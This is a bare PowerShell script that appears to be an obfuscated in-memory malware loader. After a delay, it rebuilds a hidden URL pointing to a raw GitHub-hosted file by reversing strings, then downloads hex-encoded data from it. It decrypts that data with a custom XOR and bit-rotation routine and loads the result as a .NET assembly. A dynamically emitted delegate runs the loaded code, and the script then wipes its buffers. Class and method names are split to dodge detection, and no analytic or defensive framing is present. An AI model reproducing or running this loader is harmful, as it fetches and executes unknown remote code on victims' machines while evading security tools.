[System.Threading.Thread]::Sleep(5000)

[uint32]$key = [BitConverter]::ToUInt32(([byte[]](0xC2,0x19,0x00,0x61) | % { $_ -bxor 0x9E }), 0)

function Process-Byte {
    param([byte]$b, [int]$p)
    
    [uint32]$s = [uint32]$p -bxor $key
    $s = $s -bxor ($s -shl 13)
    $s = $s -bxor ($s -shr 17)
    $s = $s -bxor ($s -shl 5)

    $v1 = [byte](($s -band 0x1F) + 1)
    $v2 = [byte](($s -shr 5) -band 0x7)
    $v3 = [byte]($s -shr 8 -band 0x3)
    
    $t = $b
    $t = [byte]($t -bxor ([byte]($s -band 0xFF)))
    $t = [byte](($t - $v1) -band 0xFF)
    $t = [byte]((($t -shr $v2) -bor ($t -shl (8 - $v2))) -band 0xFF)
    $t = [byte]($t -bxor ([byte](($v1 -shl $v3) -band 0xFF)))
    
    return $t
}

$part1 = "txt.2trats/niam/sswen"
$part2 = "/ccaatohc/moc.tnetnocresubuhtig.war//:sptth"

$reversed = $part1 + $part2
$url = -join $reversed[($reversed.Length-1)..0]

$data = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

$bytes = New-Object System.Collections.Generic.List[byte]
$tmpByte = $null

foreach ($c in $data.ToCharArray()) {
    $isHex = ($c -ge '0' -and $c -le '9') -or ($c -ge 'A' -and $c -le 'F') -or ($c -ge 'a' -and $c -le 'f')
    if (-not $isHex) { continue }
    
    if ($c -match '[0-9]') { $val = [int][char]$c - [int][char]'0' }
    elseif ($c -ge 'A' -and $c -le 'F') { $val = [int][char]$c - [int][char]'A' + 10 }
    else { $val = [int][char]$c - [int][char]'a' + 10 }
    
    if ($tmpByte -eq $null) { $tmpByte = $val }
    else {
        $bytes.Add([byte](($tmpByte * 16) -bor $val))
        $tmpByte = $null
    }
}

for ($i = 0; $i -lt $bytes.Count; $i++) {
    $bytes[$i] = Process-Byte -b $bytes[$i] -p $i
}

$raw = $bytes.ToArray()
$asm = [System.Reflection.Assembly]::Load($raw)

$typeName = "Mana" + "ger.Pro" + "gram"
$type = $asm.GetType($typeName, $false, $true)

$methodName = "He" + "lp"
$method = $type.GetMethod($methodName, [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)

$dm = New-Object System.Reflection.Emit.DynamicMethod("", [Void], $null, $type.Module, $true)
$il = $dm.GetILGenerator()
$il.Emit([System.Reflection.Emit.OpCodes]::Call, $method)
$il.Emit([System.Reflection.Emit.OpCodes]::Ret)

$action = $dm.CreateDelegate([Action])
$action.Invoke()

for ($i = 0; $i -lt $raw.Length; $i++) { $raw[$i] = 0 }
$bytes.Clear()
